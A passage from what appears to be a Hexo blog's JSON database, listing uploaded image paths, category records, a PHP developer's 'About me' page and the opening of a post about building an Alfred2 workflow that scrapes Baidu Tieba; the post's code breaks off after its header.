uploads/2012/07/dede_pwd-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/dede_pwd-300x86.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/dede_pwd_new-150x131.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/dede_pwd.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/dede_pwd_new-300x63.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/dede_server-150x144.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/dede_pwd_new.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/dede_server-300x132.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/dede_server.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/dede_source-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/dede_source-300x141.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/dede_source.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/dede_up_file-300x191.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/dede_up_file-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/dede_up_file.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/dede_user-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/dede_user-300x104.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/dede_user.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/dede_var-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/dede_var-300x178.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/dede_var.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/font-150x150.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/font-300x214.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/font.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/font_1-150x150.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/font_1-300x161.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/font_1.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/font_2-150x150.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/font_2-300x187.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/font_2.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/phpcms2008-150x150.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/phpcms2008-300x161.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/phpcms2008.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/phpcmsV9-150x150.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/phpcmsV9-300x178.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/phpcmsV9.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/pro1-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/pro1-300x189.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/pro1.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/pro2-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/pro2-300x134.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/pro2.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/pro3-150x107.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/pro3-300x86.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/pro3.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/pro4-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/pro4-300x148.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/pro4.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/pro5-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/pro5-300x213.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/pro5.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/think1-1024x386.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/think1-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/think1-300x113.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/think1.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/think2-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/think2-300x219.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/think2.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/think3-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/think3-300x240.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/think3.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/tuma1-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/tuma1.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/tuma2-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/tuma2-300x157.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/tuma2.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/tuma3-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/tuma3-300x197.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/tuma3.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/tuma4-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/tuma4-300x162.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/tuma4.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/tuma5-150x81.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/tuma5.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/tuma6-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/tuma6-300x187.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/tuma7-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/tuma6.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/tuma7-300x125.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/tuma7.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/tuma8-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/tuma8.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/tuma9-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/tuma9-300x190.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/tuma9.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/v9shell_1-150x150.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/v9shell_1-300x209.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/v9shell_1.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/v9shell_2-150x150.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/v9shell_2-300x275.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/v9shell_2.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/v9shell_3-150x78.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/v9shell_3-300x50.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/v9shell_3.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/v9shell_4-1024x163.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/v9shell_4-150x150.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/v9shell_4-300x47.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/v9shell_4.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/v9shell_41-1024x163.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/v9shell_41-150x150.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/v9shell_41-300x47.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/v9shell_41.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/v9shell_5-150x33.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/v9shell_5-300x11.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/v9shell_5.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/v9shell_6-150x150.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/v9shell_6-300x178.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/v9shell_6.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/07/閽撻奔v2.0.zip","mtime":1421659126000},{"_id":"source/asset/uploads/2012/10/001.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/10/002.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/10/003.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/10/0031.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/10/005.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/10/006.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/10/007.png","mtime":1421659126000},{"_id":"source/asset/uploads/2012/10/008.jpg","mtime":1421659126000},{"_id":"source/asset/uploads/2012/10/009.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/20121222153346861-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/20121222153346861-300x219.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/20121222153346861.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/20121222153349302-1024x575.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/20121222153349302-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/20121222153349302-300x168.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/20121222153349302.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/2012122215342748-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/2012122215342748-204x300.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/2012122215342748.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/2012122215345131-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/2012122215345131-239x300.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/2012122215345131.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/2012122215347148-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/2012122215347148-300x264.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/2012122215347148.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/2012122215349575-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/2012122215349575-300x259.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/2012122215349575.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/201381901926167-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/201381901926167-300x129.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/201381901926167.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/201381901927891-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/201381901927891-300x216.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/201381901927891.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/201381901929371-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/201381901929371-300x277.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/201381901929371.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/201381901932654-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/201381901932654-300x151.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/201381901932654.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/201381901933428-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/201381901933428-300x209.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/201381901933428.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/201381901935312-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/201381901935312-300x300.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/201381901935312.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224255j1foiui0lrc10rsh-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224255j1foiui0lrc10rsh-300x198.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224255j1foiui0lrc10rsh.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224256bl2n8535y5pvl87n-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224256bl2n8535y5pvl87n-300x78.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224256bl2n8535y5pvl87n.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224300uew6cie9zieq7cbq-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224300uew6cie9zieq7cbq-206x300.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224300uew6cie9zieq7cbq.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224303cnhu6wowugpmlpm6-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224303cnhu6wowugpmlpm6-300x202.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224303cnhu6wowugpmlpm6.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224307iz3gs432za1vawbx-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224307iz3gs432za1vawbx-300x203.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224307iz3gs432za1vawbx.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224310ayqj3g611m6tgy11-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224310ayqj3g611m6tgy11-300x174.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224310ayqj3g611m6tgy11.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224313ubvwmmtwwfyxlttg-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224313ubvwmmtwwfyxlttg-300x172.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224313ubvwmmtwwfyxlttg.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224314lf5dy5dq3b95zkkd-150x115.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224314lf5dy5dq3b95zkkd-300x47.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224314lf5dy5dq3b95zkkd.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224317qpwypa77l2gly2zv-150x117.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224317qpwypa77l2gly2zv-300x62.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224317qpwypa77l2gly2zv.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224318amdzfb6wrydsiebr-150x91.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224318amdzfb6wrydsiebr-300x38.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224318amdzfb6wrydsiebr.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224320t0idau0t1r5edyuu-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224320t0idau0t1r5edyuu-300x84.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/224320t0idau0t1r5edyuu.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-1-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-1-300x148.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-1.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-10-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-10-300x174.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-10.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-11-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-11-300x187.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-11.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-12-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-12-300x224.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-12.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-13-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-13-300x189.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-13.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-14-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-14-300x168.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-14.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-15-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-15-300x186.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-15.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-2-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-2.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-3-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-3.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-4-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-4-300x137.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-4.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-5-150x122.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-5-300x120.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-5.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-6-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-6-300x223.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-6.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-7-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-7-300x232.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-7.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-8-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-8-300x84.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-8.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-9-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-9-300x86.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/QQ20131106-9.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/屏幕快照-2013-11-06-06.05.58-PM-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/屏幕快照-2013-11-06-06.05.58-PM-300x148.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/屏幕快照-2013-11-06-06.05.58-PM.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/屏幕快照-2013-11-06-06.16.42-PM-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/屏幕快照-2013-11-06-06.16.42-PM-300x178.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/屏幕快照-2013-11-06-06.16.42-PM.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/屏幕快照-2013-11-06-06.31.12-PM-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/屏幕快照-2013-11-06-06.31.12-PM-300x234.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/屏幕快照-2013-11-06-06.31.12-PM.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/屏幕快照-2013-11-06-06.32.52-PM-150x104.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/屏幕快照-2013-11-06-06.32.52-PM-300x68.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/屏幕快照-2013-11-06-06.32.52-PM.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/屏幕快照-2013-11-06-06.43.44-PM-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/屏幕快照-2013-11-06-06.43.44-PM-300x84.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/屏幕快照-2013-11-06-06.43.44-PM.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/屏幕快照-2013-11-06-07.38.46-PM-150x150.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/屏幕快照-2013-11-06-07.38.46-PM-300x118.png","mtime":1421659126000},{"_id":"source/asset/uploads/2013/11/屏幕快照-2013-11-06-07.38.46-PM.png","mtime":1421659126000}],"Category":[{"name":"原创作品","_id":"ng1ki7p1v08zbwrz","posts":["sxqmjnrcij35mwmq","tabbnxi32od2dra1","jdfgtor0t0tojay5","td4f36ekolwmmdod","jmgnnj7ztqamyqzb","q6fjjsvgcsa20yxc","rof3jjexx9r8itzw","hvrqvqfvwq5yzxfl","345egf8bl9o7knw2","w4tp4xrfslx871s6","0rsn2md0zyzwbvnp","mflbiwe8m84wugvk","fkot7nez588egus5","7o0fcqugk1cj641a","1mh71caugci7e1d6","q3d5s2uxdoyeqik3","g6h22lvz123hf9hl","ckuiqj1lr7mg43jy","itwf5335siwcl67d","o25p37uy9qa4y6c8","9gbjb3jltxqiqn72","mrhda37nky7htbn9","a7foj3on0mqor9ty","096nlnncebstcqad","pr3nkmpsoqejchsa","b17w8n7z7elp131c","n99lwvy9ofhvb2py","hixlhm95f2ftmfig","3b7l025jo9oz6hnj","pixtpbicp8vj19ag"]},{"name":"技术文章","parent":"ng1ki7p1v08zbwrz","_id":"3ew512opa4s8w18i","posts":["sxqmjnrcij35mwmq","tabbnxi32od2dra1","jdfgtor0t0tojay5","q6fjjsvgcsa20yxc","rof3jjexx9r8itzw","hvrqvqfvwq5yzxfl","w4tp4xrfslx871s6","0rsn2md0zyzwbvnp","mflbiwe8m84wugvk","fkot7nez588egus5","7o0fcqugk1cj641a","1mh71caugci7e1d6","q3d5s2uxdoyeqik3","g6h22lvz123hf9hl","itwf5335siwcl67d","o25p37uy9qa4y6c8","9gbjb3jltxqiqn72","mrhda37nky7htbn9","a7foj3on0mqor9ty","b17w8n7z7elp131c","n99lwvy9ofhvb2py","3b7l025jo9oz6hnj","pixtpbicp8vj19ag"]},{"name":"技术文章","_id":"1bynalp69sca7b8g","posts":["bq5t8krfd8jl8d7u","s7xb1n9mhlkbqj3y","cmezltyaprjjc9f0","h8kir9r7cjvfy9cz","dzpwot7lhoo9y3v8","3q3n0burmmqt7uy0","647fmzb2anmrm4f2"]},{"name":"最新漏洞","parent":"1bynalp69sca7b8g","_id":"n6ap4t4mi3gt91g0","posts":["bq5t8krfd8jl8d7u","s7xb1n9mhlkbqj3y"]},{"name":"最新漏洞","parent":"3ew512opa4s8w18i","_id":"ynqi3ufxo1cdml3c","posts":["mflbiwe8m84wugvk","fkot7nez588egus5","3b7l025jo9oz6hnj"]},{"name":"最新漏洞","_id":"kqfzjvir5hpg7mge","posts":["wegkktr56305qmol"]}],"Page":[{"title":"关于我","date":1389694497000,"content":"<p>某游戏公司全职PHPer</p>\n<p>喜欢用各种语言进行无差别战斗</p>\n<p>coding for fun !</p>\n<hr>\n<p>QQ: 312434124</p>\n<p>Email: master@creturn.com</p>\n<p>Weibo: <a href=\"http://www.weibo.com/creturn\" target=\"_blank\" rel=\"external\">@creturn</a></p>\n<p>Github: <a href=\"http://github.com/creturn\" target=\"_blank\" rel=\"external\">http://github.com/creturn</a></p>\n<p>Wooyun: <a href=\"http://www.wooyun.org/whitehats/creturn\" target=\"_blank\" rel=\"external\">http://www.wooyun.org/whitehats/creturn</a></p>\n<hr>\n<p>有技术问题的同学可以发邮件给我，加QQ一般不太回，因为咨询问题的人太多</p>\n<p>导致没法正常工作，所以有问题的同学发邮件给我，空闲时间会回复</p>\n","source":"about/index.md","raw":"title: 关于我\ndate: 2014-01-14 18:14:57\n---\n\n某游戏公司全职PHPer\n\n喜欢用各种语言进行无差别战斗\n\ncoding for fun !\n\n\n---\n\nQQ: 312434124\n\nEmail: master@creturn.com\n\nWeibo: [@creturn](http://www.weibo.com/creturn)\n\nGithub: [http://github.com/creturn](http://github.com/creturn)\n\nWooyun: [http://www.wooyun.org/whitehats/creturn](http://www.wooyun.org/whitehats/creturn)\n\n---\n\n有技术问题的同学可以发邮件给我，加QQ一般不太回，因为咨询问题的人太多\n\n导致没法正常工作，所以有问题的同学发邮件给我，空闲时间会回复","updated":1421659126000,"path":"about/index.html","excerpt":"","_id":"14c0peicxpt2oiwd","comments":true,"layout":"page"}],"Post":[{"title":"Alfred2 的workflow 开发实例-百度贴吧插件","id":314,"date":1373095325000,"tags":["69njqdariogx08ca","xy7xe9zend2coaw0","6973km6kad7polie","s6hh2b1k04j4n0u3"],"categories":["ng1ki7p1v08zbwrz","3ew512opa4s8w18i"],"content":"<p>貌似有点懒，今年第二篇…</p>\n<p>Alfred2 os x 上的一个比较好的插件好的插件，对于命令控来说绝对是福音。</p>\n<p>官网地址：<a href=\"http://www.alfredapp.com\" target=\"_blank\" rel=\"external\">http://www.alfredapp.com</a></p>\n<p>它的插件机制加上新版本的workflow支持fallback后似的他的更受欢迎。</p>\n<p>先上一张今天要介绍的插件，贴吧的workflow。自己平时比较喜欢在贴吧里面看小说。</p>\n<p>之前找了一个贴吧的插件，不过用起来发现作者采用了缓存机制，其实加入缓存机制其实还是</p>\n<p>比较好的，不过缓存了一天多都没变化这个就有问题了。本来想直接修改原来的插件去掉缓存机制或者</p>\n<p>把缓存时间修改短点也行，但是发现是python运行编译的文件，去作者github上的看看能找到源码不结果</p>\n<p>令人很失望，一个这么简单的东西放了那么一大堆不知道都起什么作用的包，还不开放源码，还敢用吗？</p>\n<a id=\"more\"></a>\n\n<p>所以果断删掉，自己写。先看看效果图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-6.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-6.png\" alt=\"QQ20131106-6\"></a></p>\n<p>1. 首先从百度贴吧抓取贴吧对应的帖子，我们知道pc端访问<a href=\"http://tieba.baidu.com/f?kw=吧名\" target=\"_blank\" rel=\"external\">http://tieba.baidu.com/f?kw=吧名</a> 就可以访问贴吧的帖子</p>\n<p>不过为了加快访问速度和效率，我们可以抓取手机端贴吧帖子。手机端贴吧帖子页面大小相对pc端要小很多。所以获取</p>\n<p>贴吧帖子信息速度会快很多，贴吧手机版本地址为：wapp.baidu.com/f?kw=吧名</p>\n<p>2. 抓取到信息后用正则过滤出我们需要的内容然后生成相应的xml这样就可以实现我们自己的workflow</p>\n<p>代码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"preprocessor\">&lt;?php</span></div><div class=\"line\"><span class=\"comment\">/*========================================================================</span></div><div class=\"line\">#   FileName: mytieba.php</div><div class=\"line\">#     Author: Creturn</div><div class=\"line\">#      Email: master@creturn.com</div><div class=\"line\">#   HomePage: http://www.creturn.com</div><div class=\"line\"># LastChange: 2013-07-05 02:24:51</div><div class=\"line\">========================================================================*/</div><div class=\"line\"><span class=\"keyword\">require_once</span>(<span class=\"string\">'workflows.php'</span>);</div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span 